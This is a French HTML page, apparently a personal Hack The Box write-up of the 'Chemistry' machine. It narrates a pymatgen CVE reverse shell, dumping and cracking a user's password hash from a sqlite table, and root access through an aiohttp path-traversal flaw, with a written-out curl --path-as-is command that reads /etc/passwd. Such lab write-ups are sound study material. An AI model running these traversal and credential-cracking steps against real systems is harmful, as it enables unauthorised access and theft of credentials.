@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="fr" class="dark">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Chemistry - Writeup HTB</title>
+    <meta name="description" content="Writeup Hack The Box - Chemistry">
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Zalando+Sans:ital,wght@0,200..900;1,200..900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Zalando+Sans+Expanded:ital,wght@0,200..900;1,200..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../../styles.css">
+    <link rel="stylesheet" href="../writeups.css">
+    <link rel="icon" type="image/jpeg" href="../../assets/favi.png">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" defer></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js" defer></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js" defer></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-sql.min.js" defer></script>
+</head>
+
+<body class="writeups-mode">
+    <nav class="navbar">
+        <div class="container">
+            <div class="nav-content">
+                <a href="../../" class="nav-logo-link">
+                    <img src="../../assets/c8e38298-4426-4ed7-ab6b-1c8c5c263f64 (1).png" class="nav-logo"
+                        alt="logo signature Raphaël">
+                </a>
+                <div class="nav-links">
+                    <a href="../../" class="nav-link">Accueil</a>
+                    <a href="../" class="nav-link active">Writeups</a>
+                    <a href="../../Portfolio/" class="nav-link">Galerie</a>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="min-h-screen">
+        <div class="writeups-container">
+            <a href="../" class="back-link">← Retour aux writeups</a>
+            <div class="writeup-content">
+                <header>
+                    <h1 class="page-title">Chemistry</h1>
+                </header>
+
+                <div class="page-body">
+                    <h1>User</h1>
+
+                    <p>Première étape : fuzzing des répertoires pour découvrir les endpoints disponibles.</p>
+
+                    <p>En recherchant des informations sur les fichiers CIF (Crystallographic Information File), on
+                        découvre que les applications qui les interprètent utilisent généralement Python avec la
+                        bibliothèque <code>pymatgen</code>. Une CVE et un PoC sont disponibles :</p>
+
+                    <p><a href="https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f">CVE
+                            pymatgen - GHSA-vgv8-5cpj-qj2f</a></p>
+
+                    <p>Construction d'un payload contenant un reverse shell, puis exécution réussie.</p>
+
+                    <p>Exfiltration de la base de données :</p>
+
+                    <pre class="code code-wrap"><code class="language-SQL">~/Documents $ sqlite3 database.db
+SQLite version 3.51.0 2025-11-04 19:38:17
+Enter ".help" for usage hints.
+sqlite> .tables
+structure  user
+sqlite> .schema user
+CREATE TABLE user (
+        id INTEGER NOT NULL,
+        username VARCHAR(150) NOT NULL,
+        password VARCHAR(150) NOT NULL,
+        PRIMARY KEY (id),
+        UNIQUE (username)
+);
+sqlite> SELECT * FROM user;
+1|admin|2861debaf8d99436a10ed6f75a252abf
+2|app|197865e46b878d9e74a0346b6d59886a
+3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
+...</code></pre>
+
+                    <p>Le hash de l'utilisateur <code>admin</code> n'est pas disponible sur CrackStation. Cependant,
+                        celui de <code>rosa</code> est crackable : <code>unicorniosrosados</code></p>
+
+                    <p>Connexion SSH avec les credentials de rosa → accès utilisateur obtenu.</p>
+
+                    <h1>Root</h1>
+
+                    <p>L'exécution de LinPEAS révèle plusieurs informations intéressantes.</p>
+
+                    <p>Première piste explorée (CVE-2021-3560 Polkit) : sans succès.</p>
+
+                    <p>LinPEAS indique également qu'un service tourne en tant que root :</p>
+
+                    <pre
+                        class="code code-wrap"><code class="language-Bash">/usr/bin/python3.9 /opt/monitoring_site/app.py (running as root - PID 1050)</code></pre>
+
+                    <p>Pas d'accès en écriture sur ce répertoire, mais un site de monitoring s'exécute avec les
+                        privilèges root sur <code>127.0.0.1:8080</code>.</p>
+
+                    <p>Exploration du service local :</p>
+
+                    <pre class="code code-wrap"><code class="language-Bash">rosa@chemistry:~$ curl http://127.0.0.1:8080/assets
+403: Forbidden</code></pre>
+
+                    <p>Tentatives de LFI sur <code>/assets</code> initialement infructueuses.</p>
+
+                    <pre class="code code-wrap"><code class="language-Bash">rosa@chemistry:~$ curl -I http://127.0.0.1:8080
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+Server: Python/3.9 aiohttp/3.9.1</code></pre>
+
+                    <p>Le framework utilisé est <code>Aiohttp 3.9</code> (et non Werkzeug). Recherche de vulnérabilités
+                        connues sur cette version.</p>
+
+                    <p>Découverte du CVE-2024-23334 permettant une LFI via path traversal :</p>
+                    <p><a href="https://github.com/z3rObyte/CVE-2024-23334-PoC">CVE-2024-23334 PoC</a></p>
+
+                    <p>Adaptation de l'exploit : modification du chemin cible vers <code>root/root.txt</code> et du
+                        endpoint <code>/assets/</code>.</p>
+
+                    <p>Point important : l'utilisation du flag <code>--path-as-is</code> avec curl est nécessaire pour
+                        éviter la normalisation automatique des chemins :</p>
+
+                    <pre
+                        class="code code-wrap"><code class="language-Bash">curl --path-as-is "http://127.0.0.1:8080/assets/../../../etc/passwd"</code></pre>
+
+                    <p>Ressource utile : <a href="https://httpie.io/docs/cli/--path-as-is">Documentation HTTPie -
+                            --path-as-is</a></p>
+
+                    <p>Flag root obtenu avec succès.</p>
+                </div>
+            </div>
+        </div>
+    </main>
+</body>
+
+</html>
